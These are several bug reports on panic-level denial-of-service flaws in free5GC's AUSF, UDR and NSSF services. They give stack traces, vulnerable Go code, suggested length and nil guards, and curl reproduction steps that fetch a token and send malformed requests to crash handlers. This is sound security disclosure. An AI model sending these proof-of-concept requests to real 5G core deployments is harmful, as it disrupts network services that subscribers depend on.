panic({0xdcc500?, 0xc000616168?})
github.com/free5gc/ausf/internal/sbi/processor.decodeEapAkaPrime({0xc0005edb40, 0x9, 0x9})
        /go/src/free5gc/NFs/ausf/internal/sbi/processor/ue_authentication.go:723 +0xe30
github.com/free5gc/ausf/internal/sbi/processor.(*Processor).EapAuthComfirmRequestProcedure(...)
        /go/src/free5gc/NFs/ausf/internal/sbi/processor/ue_authentication.go:104 +0x25d
github.com/free5gc/ausf/internal/sbi/processor.(*Processor).HandleEapAuthComfirmRequest(...)
        /go/src/free5gc/NFs/ausf/internal/sbi/processor/ue_authentication.go:36 +0x9c
github.com/free5gc/ausf/internal/sbi.(*Server).HTTPEapAuthMethod(...)
        /go/src/free5gc/NFs/ausf/internal/sbi/api_ueauthentication.go:142 +0x4b0
```

Each subsequent malformed request reproduces the panic. Because the panic is recovered by Gin the AUSF process keeps running, but every attempt produces a stack trace and forces the request to fail — usable as a log-volume / per-request DoS, and a strong indication that no length validation was performed before the unconditional indexes.

## Expected Behavior
`decodeEapAkaPrime` should validate the input length **before** indexing:

- `if len(eapPkt) < 5 { return nil, fmt.Errorf("EAP packet too short for AKA' header") }` before `data := eapPkt[5:]`
- `if len(data) < 1 { return nil, fmt.Errorf("EAP-AKA' payload too short") }` before `data[0]`
- inside the attribute loop, ensure `i + 1 < dataLen` (i.e. at least 2 bytes available for `attrType + attrLen` header) before reading `data[i+1]`

These are pure length guards and would mirror the equivalent fixes upstream made for the eapContent nil case. After those guards a malformed EAP payload should result in a controlled `400 INVALID_EAP_PAYLOAD` (or similar) problem details, not a panic / 500.

## Environment
- free5GC Version: `v4.2.2`
- AUSF binary commit: `44dd406a` (deployed `free5gc/ausf:v4.2.2`). The same `decodeEapAkaPrime` lines 727/728/734 are **unfixed at the latest upstream commit `cf2aba6`** (which only added the eapContent nil check, not the inner length checks).
- OS: `Ubuntu 22.04 LTS`

[Bugs] UDR nudr-dr DELETE /subscription-data/{ueId}/{servingPlmnId}/ee-subscriptions/{subsId}/amf-subscriptions panics on missing UE state
items.body:
## Bug Decription
`UDR`'s `DELETE /nudr-dr/v2/subscription-data/{ueId}/{servingPlmnId}/ee-subscriptions/{subsId}/amf-subscriptions` path is single-request panicable.

The handler forwards attacker-controlled `ueId` and `subsId` into `RemoveAmfSubscriptionsInfoProcedure()`:

```go
subsId := c.Params.ByName("subsId")
s.Processor().RemoveAmfSubscriptionsInfoProcedure(c, subsId, ueId)
```

In the processor, a missing `ueId` only sets `pd`, but execution continues and immediately type-asserts the nil `value` from `sync.Map.Load()`:

```go
value, ok := udrSelf.UESubsCollection.Load(ueId)
if !ok {
    pd = util.ProblemDetailsNotFound("USER_NOT_FOUND")
}

UESubsData := value.(*udr_context.UESubsData)
```

That produces a runtime panic:

```text
panic: interface conversion: interface {} is nil, not *context.UESubsData
```

This is reachable with a single authenticated request against a fresh `UDR` instance; no pre-existing subscription state is required.

Code evidence:

- route exposure:
  - `NFs/udr/internal/sbi/api_datarepository.go:2161`
  - `NFs/udr/internal/sbi/api_datarepository.go:2170`
  - `NFs/udr/internal/sbi/api_datarepository.go:2172`
- panic root cause:
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:53`
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:56`
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:61`

Local Docker validation on March 22, 2026 confirmed:

1. restart `udr` to clear in-memory subscription state
2. obtain a valid `nudr-dr` token
3. send one `DELETE` request with nonexistent path values such as `ueId=x`, `subsId=x`
4. `UDR` returns `500`
5. logs show a nil-interface conversion panic in `RemoveAmfSubscriptionsInfoProcedure()`

In this lab Gin recovery kept the process alive, but the endpoint is still panicable by a single request and repeatedly triggerable for DoS.

## To Reproduce
Steps to reproduce the behavior:

1. Restart `UDR` to ensure a clean in-memory state:

```bash
docker restart udr
```

2. Obtain a valid `nudr-dr` token:

```bash
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=NEF&nfInstanceId=eb9990de-4cd3-41b0-b5d9-c2102b088c57&targetNfType=UDR&scope=nudr-dr'
```

3. Trigger the panic with one request:

```bash
curl -i -sS -X DELETE \
  'http://10.100.200.11:8000/nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions' \
  -H 'Authorization: Bearer <valid_nudr_dr_jwt>'
```

Observed output:

```text
HTTP/1.1 500 Internal Server Error
Content-Length: 0
```

4. Inspect `udr` logs:

```bash
docker logs --tail 40 udr 2>&1
```

Observed output includes:

```text
[ERRO][UDR][GIN] panic: interface conversion: interface {} is nil, not *context.UESubsData
github.com/free5gc/udr/internal/sbi/processor.(*Processor).RemoveAmfSubscriptionsInfoProcedure
/go/src/free5gc/NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:61
[INFO][UDR][GIN] | 500 | 10.100.200.1 | DELETE | /nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions |
```

## Expected Behavior
If the UE or subscription state does not exist, `UDR` should return a controlled `404` response.

Expected behavior:

- missing `ueId` state -> `404 USER_NOT_FOUND`
- no type assertion on nil interface values
- no panic and no stack trace

## Screenshots
Not applicable for this server-side issue.

## Environment

- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.25.5 linux/amd64`

items.title: [Bugs] NSSF `nnssf-nsselection` `GET /network-slice-information` also panics when `home-plmn-id` is provided but `slice-info-request-for-pdu-session` is omitted
items.body:
## Bug Decription
This report extends the already-confirmed `NSSF nnssf-nsselection` missing-`slice-info-request-for-pdu-session` panic family.

`NSSF`'s `GET /nnssf-nsselection/v2/network-slice-information` handler dispatches to the PDU-session path whenever `slice-info-request-for-registration` is absent:

```go
if param.SliceInfoRequestForRegistration != nil {
    status, response, problemDetails = nsselectionForRegistration(param)
} else {
    status, response, problemDetails = nsselectionForPduSession(param)
}
```

Inside `nsselectionForPduSession()`, the `home-plmn-id` rejection branch directly dereferences:

```go
*param.SliceInfoRequestForPduSession.SNssai
```

without checking whether `SliceInfoRequestForPduSession` is nil:

```go
if param.HomePlmnId != nil {
    if !util.CheckSupportedHplmn(*param.HomePlmnId) {
        authorizedNetworkSliceInfo.RejectedNssaiInPlmn = append(
            authorizedNetworkSliceInfo.RejectedNssaiInPlmn,
            *param.SliceInfoRequestForPduSession.SNssai)
```

Local validation on March 22, 2026 confirmed two authenticated single-request variants:

1. `home-plmn-id` is provided, `slice-info-request-for-registration` is absent, and `slice-info-request-for-pdu-session` is omitted entirely
2. the same request path is used with `slice-info-request-for-pdu-session={}`

Both variants return `500` and hit the same sink at `nsselection_network_slice_information.go:576`.

Relevant source evidence:

- route handler:
  - `NFs/nssf/internal/sbi/api_nsselection.go:35`
  - `NFs/nssf/internal/sbi/api_nsselection.go:53`
- PDU-session dispatch:
  - `NFs/nssf/internal/sbi/processor/nsselection_network_slice_information.go:104`
  - `NFs/nssf/internal/sbi/processor/nsselection_network_slice_information.go:109`
- nil-dereference sink:
  - `NFs/nssf/internal/sbi/processor/nsselection_network_slice_information.go:571`
  - `NFs/nssf/internal/sbi/processor/nsselection_network_slice_information.go:576`

This is a request-level panic DoS on the NS selection path. In this lab Gin recovery converted the panic into `500`, but the route remains remotely panicable and repeatedly triggerable.

## To Reproduce
Steps to reproduce the behavior:

1. Obtain a valid `nnssf-nsselection` token:

```bash
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=NEF&nfInstanceId=eb9990de-4cd3-41b0-b5d9-c2102b088c57&targetNfType=NSSF&scope=nnssf-nsselection'
```

2. Send the authenticated `GET` request with `home-plmn-id` but without registration info:

```bash
curl -G -i 'http://10.100.200.8:8000/nnssf-nsselection/v2/network-slice-information' \
  -H 'Authorization: Bearer <valid_nnssf_nsselection_jwt>' \
  --data-urlencode 'nf-type=AMF' \
  --data-urlencode 'nf-id=11111111-1111-4111-8111-111111111111' \
  --data-urlencode 'home-plmn-id={"mcc":"208","mnc":"93"}'
```

3. Observe `HTTP/1.1 500 Internal Server Error`.
4. Repeat with `--data-urlencode 'slice-info-request-for-pdu-session={}'` and observe the same `500`.
5. Inspect `nssf` logs and confirm the panic at `nsselection_network_slice_information.go:576`.

## Expected Behavior
`NSSF` should reject PDU-session selection requests missing `slice-info-request-for-pdu-session` with a controlled `400 Bad Request`, not panic.

Expected behavior:

- if `slice-info-request-for-registration` is absent, the request should not enter PDU-session logic unless `slice-info-request-for-pdu-session` is present and complete
- `SliceInfoRequestForPduSession` should not be dereferenced unless it is non-nil
- malformed authenticated query input should not generate a panic or stack trace

## Screenshots
N/A

## Environment
- free5GC Version: `v4.2.1`
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.25.5 linux/amd64`
- Runtime image: `free5gc/nssf:v4.2.1`
- Validation date: `2026-03-22`
- Runtime SBI endpoint: `10.100.200.8:8000`

Relevant `docker logs --tail 120 nssf` excerpt:

```text

2026-03-22T06:07:51.205171958Z [WARN][NSSF][Util] No Home PLMN {Mcc:208 Mnc:93} in NSSF configuration
2026-03-22T06:07:51.207117806Z [ERRO][NSSF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
```
